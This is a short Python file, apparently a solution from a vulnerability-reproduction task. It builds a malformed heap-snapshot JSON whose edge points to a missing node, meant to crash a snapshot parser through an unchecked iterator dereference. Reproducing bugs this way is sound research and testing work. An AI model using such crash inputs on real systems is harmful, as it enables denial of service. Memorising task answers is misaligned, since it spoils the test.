import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to PaddlePaddle issue 28766 where the memory snapshot parser
        dereferences a map iterator without checking if it hit the end when looking up a node ID
        referenced by an edge.
        
        We generate a minimal valid V8-like Heap Snapshot JSON with:
        1. Minimal meta describing fields (id for nodes, to_node for edges).
        2. One node with ID 1.
        3. One edge pointing to 'to_node' 2.
        
        Since node 2 does not exist, the lookup in node_id_map fails (returns end()).
        The missing check causes the invalid iterator to be dereferenced, crashing the process.
        """
        payload = {
            "snapshot": {
                "meta": {
                    "node_fields": ["id"],
                    "node_types": [[]],
                    "edge_fields": ["to_node"],
                    "edge_types": [[]]
                }
            },
            "nodes": [1],
            "edges": [2],
            "strings": []
        }
        return json.dumps(payload, separators=(',', ':')).encode('utf-8')